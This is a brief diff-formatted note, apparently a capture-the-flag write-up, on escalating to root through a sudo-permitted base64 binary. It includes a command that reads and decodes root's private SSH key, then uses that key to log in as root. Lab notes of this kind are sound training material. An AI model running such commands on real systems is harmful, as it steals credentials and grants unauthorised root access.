@@ -1,0 +1,10 @@
+Sudo Example 2 
+sudo -l and see that the base64 can run with no passwd 
+
+go to GTFObins and search for base64 
+
+use base64 to decode the ssh key 
+base64 /root/.ssh/id_rsa | base64 --decode
+
+ssh into server as root using the decoded key 
+cat flag 
